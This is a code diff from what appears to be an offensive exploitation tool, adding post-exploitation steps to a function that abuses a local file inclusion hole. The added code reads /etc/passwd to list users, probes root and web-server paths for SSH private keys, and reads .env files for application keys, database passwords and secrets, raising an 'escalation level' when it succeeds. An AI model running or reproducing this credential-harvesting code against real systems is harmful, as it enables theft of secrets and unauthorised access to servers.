@@ -13441,4 +13441,45 @@ def escalate_post_lfi(
         except Exception:
             pass
 
+    # 4. /etc/passwd — user enumeration
+    try:
+        passwd = request_fn("/etc/passwd")
+        if passwd and "root:" in passwd:
+            _users = [ln.split(":")[0] for ln in passwd.splitlines()
+                      if ln.strip() and not ln.startswith("#")][:10]
+            result["etc_passwd_users"] = _users
+            if result["escalation_level"] == "none":
+                result["escalation_level"] = "creds"
+            step(f"  post-lfi: /etc/passwd leido — {len(_users)} usuarios: {_users[:5]}")
+    except Exception:
+        pass
+
+    # 5. SSH private key for www-data/root
+    for _ssh_path in ("/root/.ssh/id_rsa", "/var/www/.ssh/id_rsa", "/home/www-data/.ssh/id_rsa"):
+        try:
+            _key = request_fn(_ssh_path)
+            if _key and "PRIVATE KEY" in _key:
+                result["ssh_private_key_found"] = _ssh_path
+                result["escalation_level"] = "log_poison_rce"
+                step(f"  post-lfi: SSH private key encontrada en {_ssh_path!r}")
+                break
+        except Exception:
+            pass
+
+    # 6. .env file
+    for _env_path in ("/var/www/html/.env", "/var/www/.env", "/app/.env"):
+        try:
+            _env = request_fn(_env_path)
+            if _env and ("APP_KEY=" in _env or "DB_PASSWORD=" in _env or "SECRET=" in _env):
+                _env_keys = [ln.split("=")[0] for ln in _env.splitlines()
+                             if "=" in ln and not ln.startswith("#")][:15]
+                result["dotenv_found"] = _env_path
+                result["dotenv_keys"] = _env_keys
+                if result["escalation_level"] == "none":
+                    result["escalation_level"] = "creds"
+                step(f"  post-lfi: .env leido en {_env_path!r} — claves: {_env_keys[:5]}")
+                break
+        except Exception:
+            pass
+
     return result
